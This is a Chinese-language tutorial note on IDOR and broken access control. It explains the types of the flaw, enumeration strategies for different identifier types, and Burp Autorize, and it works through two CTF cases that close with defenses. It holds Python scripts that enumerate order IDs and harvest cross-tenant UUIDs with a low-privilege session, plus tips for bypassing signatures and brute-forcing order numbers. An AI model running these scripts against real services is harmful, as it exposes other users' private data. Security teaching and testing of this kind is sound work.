---
title: 越权漏洞（IDOR）
aliases: [越权, IDOR, 水平越权, 垂直越权, BOLA, 未授权访问]
category: exp
status: current
updated: 2026-07
---

# 越权漏洞（IDOR / Broken Access Control）

## 一句话理解
越权是指服务端只验证了"你有没有登录"，却没有验证"这个资源是不是你的、这个操作你配不配"，导致低权限用户可以读写他人数据或调用高权限功能。

## 核心原理
- 认证（Authentication）解决"你是谁"，授权（Authorization）解决"你能做什么"
- 越权的本质是服务端把"能访问接口"等同于"有权操作对象"，缺少对象级（object-level）或功能级（function-level）的归属校验
- 前端隐藏按钮、隐藏菜单、不暴露链接都不是防护，只是"藏"；服务端不校验，直接构造请求即可命中

## 三种形态
### 1. 水平越权
同权限用户之间互相访问。例如用户 A 把 `id=1001` 改成 `id=1002`，看到用户 B 的订单。

### 2. 垂直越权
低权限用户使用高权限功能。例如普通用户直接请求管理员接口 `POST /admin/addUser`。

### 3. IDOR
IDOR（Insecure Direct Object Reference，不安全的直接对象引用）是水平越权的典型实现：请求参数直接暴露数据库主键、文件名、订单号等对象引用，服务端未校验归属。OWASP API Security Top 1（BOLA）本质上就是它。

## 成立条件
通常需要满足：
- 请求中存在标识资源的参数（`id`、`uid`、`orderNo`、`fileId`、`doc`）
- 服务端仅校验登录态，不校验参数指向的对象归属当前会话
- 攻击者拥有合法低权限账号（垂直越权时甚至不需要）

## 常见攻击面
- RESTful 接口：`/api/user/{id}`、`/api/order/{orderNo}`
- 查询参数：`?uid=1`、`?file=report.pdf`
- JSON Body：`{"userId": 1001}`、`{"role": "admin"}`（注册时提权）
- 批量接口：`/api/export?ids=1,2,3`，一次拖出大量数据
- 文件下载、预览、导出、分享链接
- 隐藏接口：前端没有入口但接口真实存在（从 JS、Swagger、历史包里翻）
- 修改类操作（POST/PUT/DELETE）越权危害远大于查询类

## 快速判断
### 1. 双账号对比法（推荐）
- 注册/准备两个账号 A、B
- 用 A 的操作抓包，把会话换成 B（Cookie/Token 替换），资源参数保持指向 A 的对象
- 如果 B 能读到/改到 A 的数据，水平越权成立

### 2. 参数递增减
数字型 id 直接 `+1/-1` 遍历，观察返回数据是否属于他人。

### 3. 观察点
- 响应数据是否随参数变化而变化，与会话无关
- 服务端返回的报错是否泄露对象存在性（存在/不存在两种报错可枚举）

## 常见利用技巧
- 参数位置全测一遍：URL 路径、Query、Body 表单、JSON、Cookie、Header（`X-User-Id`）
- JSON 嵌套与数组：`{"user":{"id":2}}`、`id=1&id=2`（参数污染）
- 请求方法篡改：`GET` 拒绝后试 `POST/PUT/PATCH`
- GUID/UUID 不可遍历，但可以结合信息泄露（评论、分享、列表接口）拿到他人 UUID 后再越权
- 越权 + CSRF / 越权 + XSS 可组合放大危害

## 标识符类型与遍历策略

拿到目标接口后，先看参数里的标识符是哪一类，再决定打法：

| 标识符类型 | 示例 | 可遍历性 | 策略 |
| --- | --- | --- | --- |
| 自增 ID | `id=1001` | 可，直接 `+1/-1` | 脚本批量扫（思路见下文「id 遍历脚本思路」） |
| UUID / GUID | `uid=550e8400-e29b-...` | 不可枚举 | 换思路收集他人 UUID（见下） |
| 间接引用（订单号+用户号双字段） | `orderNo` + `userId` | 半 | 只改其一，观察服务端校验了哪个字段 |
| 时间戳+随机数订单号 | `2026091314xyz789` | 可撞库 | 时间窗口 + 熵不足时批量生成候选 |
| 加密/签名 ID | `id=eyJhbGciOi...` | 不可 | 先测可否篡改，转密码学问题 |

### 1. 自增 ID：直接遍历
最理想的形态。`id=1001` 改成 `1002` 即可换人，配合脚本按响应长度聚类批量扫（脚本思路见下文工具节）。

### 2. UUID / GUID：不可遍历，换思路收集
UUID 空间巨大（122 bit 随机），枚举不现实，攻击面转向"哪里能拿到别人的 UUID"：
- 列表接口：评论列表、排行榜、分享列表常返回他人对象的 UUID
- 搜索接口：全局搜索不过滤归属，命中他人对象时响应里带 UUID
- 日志泄露：错误页、调试接口、`X-Request-Id` 回显等打印过他人请求参数
- 缓存：CDN 缓存、浏览器缓存中残留他人请求的 UUID

拿到 UUID 后回到详情/操作接口替换验证是否缺归属校验（完整流程见下文「案例二：UUID 越权」）。

### 3. 间接引用（订单号 + 用户号双字段）
请求同时携带 `orderNo` 与 `userId`（或 token 里的 uid 与 body 里的 uid）时：
- **只改其一**：把 `orderNo` 换成他人的、`userId` 保持自己的——服务端若按 `userId` 查"我的订单"后按 `orderNo` 取详情却不校验两者关联，越权成立
- 反过来只改 `userId` 同理；两个方向都测，才能区分服务端到底校验了哪个字段

### 4. 时间戳 + 随机数生成的订单号
若随机段太短（如 4 位数字）或时间窗口已知，写脚本在时间窗口内批量生成候选单号撞库——本质是把"不可遍历"退化成"可撞库"，一秒钟几千次请求即可覆盖低熵空间。

### 5. 加密 / 签名 ID：先测可否篡改
- 看是否只是 Base64/Hex **编码**而非加密：解码后是明文 ID → 改完再编码回去即可
- 看是否**只加密不签名**：篡改密文不报错或报错可区分 → 逐位/分组爆破
- 看签名可否绕过：长度扩展攻击、去掉签名参数重放、编码变换重放
- 密码学层面的完整分析思路见 [VUL-Crypto](../vul/VUL-Crypto.md)

## 工具

### Burp Autorize
核心思路是"自动重放 + 身份替换"，把人工双账号对比自动化：

1. BApp Store 安装 Autorize，用**低权限（攻击者）**账号登录，把其 Cookie/Token 填入插件
2. 用**高权限/受害者**账号在浏览器正常浏览功能点
3. Autorize 对每个请求自动重放三份：原身份、替换成低权限身份、无身份，并对比响应

结果看颜色：**绿色（Bypass）= 低权限身份也拿到了数据，越权成立**；灰色（Enforced）= 服务端有校验。绿色条目需人工复核响应内容，排除只是返回报错的误报。

### Burp Authz
轻量替代：对选中的请求自动替换/删除 Cookie（配置里填入攻击者会话）后重放，看响应状态码与长度差异，适合批量快速验证"换会话后接口是否仍可用"。

### id 遍历脚本思路
1. 账号 A 抓包目标接口，记录请求模板与"本人数据"的响应指纹（长度、关键字）
2. 换 B 的会话重放同一请求：响应仍返回 A 的数据 => 数据与会话无关，越权成立
3. 循环替换 id，对比每条响应长度/关键字，与本人数据不同的条目即他人数据

```python
import requests

url = 'http://target/api/order/'              # 目标接口
headers = {'Cookie': 'session=<攻击者B的会话>'}

for oid in range(1, 500):
    r = requests.get(url + str(oid), headers=headers)
    # 无归属校验时，他人订单同样返回 200
    if r.status_code == 200 and 'flag' in r.text:
        print('[+] order %d: %s' % (oid, r.text[:100]))
```

### 自动化对比脚本要点

Burp Autorize 是"自动重放 + 身份替换 + 三份对比"，接口数量少或需要精细控制对比逻辑时，可以自己写脚本。核心是**双会话（A/B 账号）对同一请求各发一遍，对比三个维度**：
- 状态码：B 拿到 200 而 A 才该有权限 → 可疑；401/403 → 有校验
- 响应长度：与 A 的响应一致 → 返回的数据与会话无关，越权实锤
- 关键内容：A 数据的特征字段（用户名、手机号、uid）是否出现在 B 的响应里（防"长度碰巧相同"误判）

Python 伪代码框架：

```python
import requests

TARGET = 'http://target/api/order/1001'        # 待测请求（资源属于 A）

# 双会话：A 为资源所有者，B 为低权限攻击者
sess_a = {'Cookie': 'session=<A的会话>'}
sess_b = {'Cookie': 'session=<B的会话>'}

def fingerprint(resp):
    # 采集三个对比维度：状态码 / 响应长度 / 关键内容
    return (resp.status_code, len(resp.content), 'username' in resp.text)

ra = requests.get(TARGET, headers=sess_a)      # 基准：本人正常访问
rb = requests.get(TARGET, headers=sess_b)      # 攻击：换会话重放同一请求

if fingerprint(ra) == fingerprint(rb):
    print('[!] B 与 A 响应一致 => 越权（Bypass）')
elif rb.status_code == 200:
    print('[?] 200 但内容不同，人工复核响应差异')   # 可能是部分越权或模板页
else:
    print('[-] 服务端有归属校验（Enforced）')
```

扩展方向：把 `TARGET` 换成请求列表循环跑，即可实现批量的 Autorize 效果；对 POST/PUT 等修改类操作，测试后记得回滚数据。

## 与相邻概念的区别
| 概念 | 区别 |
| --- | --- |
| 未授权访问 | 完全不需要登录态即可访问，越权是"有登录态但权限边界失守" |
| CSRF | 借用受害者的身份发起请求；越权是攻击者用自己的身份访问不该访问的对象 |
| 信息泄露 | 越权读到的数据本身常构成信息泄露，但越权强调的是"校验缺失" |

## 案例一：一道 IDOR CTF 题完整流程

题目：商城应用，注册登录后可查看"我的订单"，flag 藏在某笔特殊订单里。

1. **准备双账号**：注册 A（uid=1001）、B（uid=1002）两个账号，A 正常下一单摸清功能。
2. **抓包定位接口**：A 点击"我的订单"，抓到 `GET /api/order/1001`，返回 A 的订单 JSON。
3. **双账号对比验证**：保持参数不变，把 Cookie 换成 B 的会话重放 `GET /api/order/1001`——仍返回 200 与 A 的订单数据。接口只认登录态、不校验订单归属，**水平越权（IDOR）成立**。
4. **遍历 id**：用 B 的会话脚本遍历 `/api/order/1..999`，按响应长度聚类，标记内容异常的订单：

```python
import requests

headers = {'Cookie': 'session=<B的会话>'}
for oid in range(1, 1000):
    r = requests.get('http://target/api/order/%d' % oid, headers=headers)
    if r.status_code == 200 and 'flag' in r.text:
        print('[+] order %d: %s' % (oid, r.text))
        break
```

5. **命中 flag**：`oid=666`（他人订单）的备注字段返回 `flag{...}`。
6. **复盘根因**：服务端只做了登录校验 `if (login)`，缺少 `order.userId == session.uid` 的对象归属校验——补上这一行，漏洞即闭合。

## 案例二：UUID 越权（跨租户数据）

题目：SaaS 多租户项目管理系统，成员登录后只能查看本租户的项目，flag 藏在管理员所属租户的项目描述里。详情接口用 UUID 做标识，自增 ID 遍历那套打法直接失效。

1. **定位接口**：抓包"查看项目"得到 `GET /api/project/detail?projectId=550e8400-e29b-41d4-a716-446655440000`，`projectId` 是 UUID——空间 122 bit，枚举不现实。
2. **换思路收集他人 UUID**：测试全局搜索功能 `GET /api/search?q=test`，发现搜索结果**不按租户过滤**，返回了所有租户的公开项目卡片，每张卡片都带 `projectId`（UUID）与租户名——列表接口就是 UUID 的来源。
3. **详情接口替换**：从搜索结果里挑出管理员租户的 `projectId`，用**自己（本租户）的会话**请求详情接口——仍返回 200 与完整项目 JSON（成员邮箱、配置、描述），**跨租户水平越权成立**。

```python
import requests

headers = {'Cookie': 'session=<本租户成员的会话>'}

# 第一步：搜索接口收集全量他人 UUID（列表接口 = UUID 来源）
r = requests.get('http://target/api/search', params={'q': 'test'}, headers=headers)
uuids = [item['projectId'] for item in r.json()['results']]   # 混有他租户项目

# 第二步：详情接口逐个替换，收割跨租户数据
for pid in uuids:
    d = requests.get('http://target/api/project/detail',
                     params={'projectId': pid}, headers=headers)
    # 只认登录态不认归属时，他租户项目同样 200
    if d.status_code == 200 and 'flag' in d.text:
        print('[+] %s: %s' % (pid, d.text))
        break
```

4. **命中 flag**：管理员租户某项目的描述字段返回 `flag{...}`。
5. **复盘根因**：两处缺陷叠加——详情接口只校验登录态、不校验项目归属租户；搜索接口又未做租户隔离，把他租户 UUID 送到攻击者手上。**UUID 只降低了被猜中的概率，代替不了归属校验**；任何能泄露他人 UUID 的接口（列表/搜索/日志/缓存）都是它的克星。

## 防御要点
- 服务端对每个请求做对象归属校验（`resource.ownerId == session.userId`）
- 功能级接口做角色/权限校验，不依赖前端隐藏
- 优先使用间接引用：会话内维护用户可访问对象列表，参数只传序号
- 不可猜测的 ID（UUID）只能降低枚举效率，不能替代鉴权
- 失败时返回统一提示，避免泄露对象存在性

## 参考
- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger Access control vulnerabilities](https://portswigger.net/web-security/access-control)
- [OWASP API Security Top 10 - BOLA](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [OWASP Insecure Direct Object Reference Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
